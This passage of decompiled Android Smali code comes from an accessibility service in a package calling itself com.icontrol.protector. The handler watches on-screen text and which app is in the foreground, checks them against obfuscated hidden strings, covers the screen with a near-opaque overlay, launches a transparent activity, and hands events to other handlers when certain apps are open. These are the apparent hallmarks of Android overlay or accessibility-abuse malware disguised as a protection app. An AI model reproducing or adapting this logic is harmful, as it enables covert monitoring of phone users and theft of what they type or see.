    invoke-static {v0, v4, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_e

    sget-object v4, Lcom/icontrol/protector/My_Configs;->Use_Access:Ljava/lang/String;

    new-array v11, v13, [B

    const/16 v14, 0xb

    aput-byte v14, v11, v12

    new-array v14, v3, [B

    fill-array-data v14, :array_16

    invoke-static {v11, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v4, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_e

    if-eqz v7, :cond_e

    invoke-static {v5}, Lcom/icontrol/protector/a;->g(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_e
    :try_start_3
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    const/16 v4, 0x4000

    if-ne v8, v4, :cond_1f

    :try_start_4
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    if-eqz v4, :cond_1f

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v14

    const/16 v15, 0xa

    const/16 v6, 0x9

    const/4 v11, 0x2

    const/4 v12, 0x3

    const/4 v9, 0x4

    sparse-switch v14, :sswitch_data_0

    goto/16 :goto_5

    :sswitch_0
    new-array v6, v10, [B

    fill-array-data v6, :array_17

    new-array v14, v3, [B

    fill-array-data v14, :array_18

    invoke-static {v6, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_f

    move v4, v12

    goto/16 :goto_6

    :catch_4
    move-exception v0

    goto/16 :goto_a

    :sswitch_1
    new-array v6, v6, [B

    fill-array-data v6, :array_19

    new-array v14, v3, [B

    fill-array-data v14, :array_1a

    invoke-static {v6, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_f

    const/4 v4, 0x0

    goto :goto_6

    :sswitch_2
    new-array v6, v15, [B

    fill-array-data v6, :array_1b

    new-array v14, v3, [B

    fill-array-data v14, :array_1c

    invoke-static {v6, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_f

    move v4, v13

    goto :goto_6

    :sswitch_3
    new-array v6, v6, [B

    fill-array-data v6, :array_1d

    new-array v14, v3, [B

    fill-array-data v14, :array_1e

    invoke-static {v6, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_f

    move v4, v11

    goto :goto_6

    :sswitch_4
    new-array v6, v3, [B

    fill-array-data v6, :array_1f

    new-array v14, v3, [B

    fill-array-data v14, :array_20

    invoke-static {v6, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_f

    const/4 v4, 0x5

    goto :goto_6

    :sswitch_5
    new-array v6, v15, [B

    fill-array-data v6, :array_21

    new-array v14, v3, [B

    fill-array-data v14, :array_22

    invoke-static {v6, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    if-eqz v4, :cond_f

    move v4, v9

    goto :goto_6

    :cond_f
    :goto_5
    const/4 v4, -0x1

    :goto_6
    if-eqz v4, :cond_1e

    const/4 v6, 0x6

    if-eq v4, v13, :cond_1c

    if-eq v4, v11, :cond_1b

    if-eq v4, v12, :cond_12

    if-eq v4, v9, :cond_11

    const/4 v2, 0x5

    if-eq v4, v2, :cond_10

    goto/16 :goto_9

    :cond_10
    :try_start_5
    sget-object v0, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    invoke-virtual {v0, v13}, Landroid/view/View;->setClickable(Z)V

    sget-object v0, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    sget-object v2, Lcom/icontrol/protector/AccessServices;->H:Landroid/view/WindowManager$LayoutParams;

    invoke-virtual {v0, v2}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    sget-object v0, Lcom/icontrol/protector/AccessServices;->q:Landroid/view/WindowManager;

    sget-object v2, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    sget-object v3, Lcom/icontrol/protector/AccessServices;->H:Landroid/view/WindowManager$LayoutParams;

    :goto_7
    invoke-interface {v0, v2, v3}, Landroid/view/ViewManager;->updateViewLayout(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    goto/16 :goto_9

    :cond_11
    sget-object v0, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Landroid/view/View;->setClickable(Z)V

    sget-object v0, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    sget-object v2, Lcom/icontrol/protector/AccessServices;->I:Landroid/view/WindowManager$LayoutParams;

    invoke-virtual {v0, v2}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    sget-object v0, Lcom/icontrol/protector/AccessServices;->q:Landroid/view/WindowManager;

    sget-object v2, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    sget-object v3, Lcom/icontrol/protector/AccessServices;->I:Landroid/view/WindowManager$LayoutParams;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    goto :goto_7

    :cond_12
    const/16 v4, 0x10

    :try_start_6
    new-array v4, v4, [B

    fill-array-data v4, :array_23

    new-array v14, v3, [B

    fill-array-data v14, :array_24

    invoke-static {v4, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    sget-object v14, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v4, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_1a

    sget-object v4, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/LinearLayout;

    invoke-virtual {v4}, Landroid/view/View;->getParent()Landroid/view/ViewParent;

    move-result-object v4

    if-nez v4, :cond_13

    sget-object v4, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    sget-object v15, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/LinearLayout;

    invoke-virtual {v4, v15}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    :cond_13
    sget-object v4, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    new-array v10, v10, [B

    fill-array-data v10, :array_25

    new-array v15, v3, [B

    fill-array-data v15, :array_26

    invoke-static {v10, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-static {v10}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v10

    invoke-virtual {v4, v10}, Landroid/view/View;->setBackgroundColor(I)V

    sget-object v4, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    invoke-virtual {v4}, Landroid/view/View;->getBackground()Landroid/graphics/drawable/Drawable;

    move-result-object v4

    const/16 v10, 0xfc

    invoke-virtual {v4, v10}, Landroid/graphics/drawable/Drawable;->setAlpha(I)V

    sget-object v4, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/LinearLayout;

    sget-object v10, Lcom/icontrol/protector/AccessServices;->M:Landroid/widget/TextView;

    invoke-virtual {v4, v10}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    sget-object v4, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/LinearLayout;

    sget-object v10, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/ProgressBar;

    invoke-virtual {v4, v10}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    const/16 v4, 0xd

    new-array v10, v4, [B

    fill-array-data v10, :array_27

    new-array v4, v3, [B

    fill-array-data v4, :array_28

    invoke-static {v10, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_1a

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v4

    if-ne v4, v13, :cond_14

    new-array v4, v9, [B

    fill-array-data v4, :array_29

    new-array v6, v3, [B

    fill-array-data v6, :array_2a

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto/16 :goto_8

    :cond_14
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v4

    if-ne v4, v11, :cond_15

    new-array v4, v9, [B

    fill-array-data v4, :array_2b

    new-array v6, v3, [B

    fill-array-data v6, :array_2c

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto :goto_8

    :cond_15
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v4

    if-ne v4, v12, :cond_16

    new-array v4, v9, [B

    fill-array-data v4, :array_2d

    new-array v6, v3, [B

    fill-array-data v6, :array_2e

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto :goto_8

    :cond_16
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v4

    if-ne v4, v9, :cond_17

    new-array v4, v9, [B

    fill-array-data v4, :array_2f

    new-array v6, v3, [B

    fill-array-data v6, :array_30

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto :goto_8

    :cond_17
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v4

    if-ne v4, v6, :cond_18

    const/4 v4, 0x5

    new-array v6, v4, [B

    fill-array-data v6, :array_31

    new-array v4, v3, [B

    fill-array-data v4, :array_32

    invoke-static {v6, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto :goto_8

    :cond_18
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v4

    const/16 v6, 0xe

    if-ne v4, v6, :cond_19

    new-array v4, v9, [B

    fill-array-data v4, :array_33

    new-array v6, v3, [B

    fill-array-data v6, :array_34

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto :goto_8

    :cond_19
    new-array v4, v9, [B

    fill-array-data v4, :array_35

    new-array v6, v3, [B

    fill-array-data v6, :array_36

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    :goto_8
    invoke-direct {v1, v0, v4}, Lcom/icontrol/protector/AccessServices;->u(Landroid/content/Context;Ljava/lang/String;)V

    :cond_1a
    sget-object v0, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    invoke-virtual {v0, v13}, Landroid/view/View;->setClickable(Z)V

    sget-object v0, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    const/4 v4, 0x0

    invoke-virtual {v0, v4}, Landroid/view/View;->setVisibility(I)V

    sget-object v0, Lcom/icontrol/protector/AccessServices;->q:Landroid/view/WindowManager;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    sget-object v6, Lcom/icontrol/protector/AccessServices;->I:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v4, v6}, Landroid/view/ViewManager;->updateViewLayout(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v4, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->r:Ljava/lang/String;

    sget-object v6, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v0, v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto :goto_9

    :cond_1b
    sget-object v0, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    const/4 v4, 0x0

    invoke-virtual {v0, v4}, Landroid/view/View;->setClickable(Z)V

    sget-object v0, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    invoke-virtual {v0, v3}, Landroid/view/View;->setVisibility(I)V

    sget-object v0, Lcom/icontrol/protector/AccessServices;->q:Landroid/view/WindowManager;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->G:Landroid/widget/FrameLayout;

    sget-object v6, Lcom/icontrol/protector/AccessServices;->I:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v4, v6}, Landroid/view/ViewManager;->updateViewLayout(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sget-object v4, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->r:Ljava/lang/String;

    sget-object v6, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    invoke-direct/range {p0 .. p0}, Lcom/icontrol/protector/AccessServices;->p()V

    goto :goto_9

    :cond_1c
    sget-object v0, Lcom/icontrol/protector/AccessServices;->Y:Ljava/util/HashMap;

    new-array v4, v6, [B

    fill-array-data v4, :array_37

    new-array v9, v3, [B

    fill-array-data v9, :array_38

    invoke-static {v4, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->K:Landroid/widget/TextView;

    if-eqz v4, :cond_1d

    invoke-virtual {v4, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_1d
    sget-object v0, Lcom/icontrol/protector/AccessServices;->Y:Ljava/util/HashMap;

    new-array v4, v6, [B

    fill-array-data v4, :array_39

    new-array v6, v3, [B

    fill-array-data v6, :array_3a

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_9

    :cond_1e
    new-instance v0, Landroid/content/Intent;

    const-class v4, Lcom/icontrol/protector/TransparentActivity;

    invoke-direct {v0, v1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v4, 0x10000000

    invoke-virtual {v0, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x10000

    invoke-virtual {v0, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :catch_5
    :goto_9
    return-void

    :goto_a
    :try_start_7
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    goto :goto_b

    :catch_6
    move-exception v0

    goto/16 :goto_f

    :cond_1f
    :goto_b
    :try_start_8
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_20

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_20

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_7

    goto :goto_c

    :cond_20
    const-string v0, ""

    :goto_c
    :try_start_9
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v4

    if-lez v4, :cond_22

    sget-object v4, Lcom/icontrol/protector/a;->d:Ljava/util/ArrayList;

    invoke-virtual {v4, v0}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_22

    sget-object v4, Lcom/icontrol/protector/a;->e:Ljava/util/Map;

    invoke-interface {v4, v0}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/Boolean;

    if-eqz v4, :cond_21

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-nez v4, :cond_22

    :cond_21
    sget-object v4, Lcom/icontrol/protector/a;->e:Ljava/util/Map;

    sget-object v6, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-interface {v4, v0, v6}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-direct {v1, v0}, Lcom/icontrol/protector/AccessServices;->z(Ljava/lang/String;)V

    :cond_22
    const/16 v4, 0xf

    new-array v6, v4, [B

    fill-array-data v6, :array_3b

    new-array v9, v3, [B

    fill-array-data v9, :array_3c

    invoke-static {v6, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_23

    const/16 v6, 0x11

    new-array v9, v6, [B

    fill-array-data v9, :array_3d

    new-array v10, v3, [B

    fill-array-data v10, :array_3e

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-nez v9, :cond_23

    const/16 v9, 0xc

    new-array v9, v9, [B

    fill-array-data v9, :array_3f

    new-array v10, v3, [B

    fill-array-data v10, :array_40

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-nez v9, :cond_23

    const/16 v9, 0x1a

    new-array v9, v9, [B

    fill-array-data v9, :array_41

    new-array v10, v3, [B

    fill-array-data v10, :array_42

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-nez v9, :cond_23

    new-array v6, v6, [B

    fill-array-data v6, :array_43

    new-array v9, v3, [B

    fill-array-data v9, :array_44

    invoke-static {v6, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_23

    new-array v4, v4, [B

    fill-array-data v4, :array_45

    new-array v6, v3, [B

    fill-array-data v6, :array_46

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_24

    :cond_23
    invoke-static {v2, v1}, Lcom/icontrol/protector/y;->a(Landroid/view/accessibility/AccessibilityEvent;Lcom/icontrol/protector/AccessServices;)V

    invoke-static {v2, v1}, Lcom/icontrol/protector/x;->b(Landroid/view/accessibility/AccessibilityEvent;Lcom/icontrol/protector/AccessServices;)V

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v6;->h(Landroid/view/accessibility/AccessibilityEvent;Landroid/content/Context;)V

    invoke-static {v2, v1}, Lcom/icontrol/protector/f;->h(Landroid/view/accessibility/AccessibilityEvent;Landroid/content/Context;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_7

    :cond_24
    move-object v4, v0

    goto :goto_d

    :catch_7
    const/4 v4, 0x0

    :goto_d
    :try_start_a
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    if-eqz v4, :cond_25

    invoke-static {v4, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->x(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v6
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_6

    if-eqz v6, :cond_25

    const/16 v6, 0x80

    :try_start_b
    invoke-virtual {v0, v4, v6}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v4

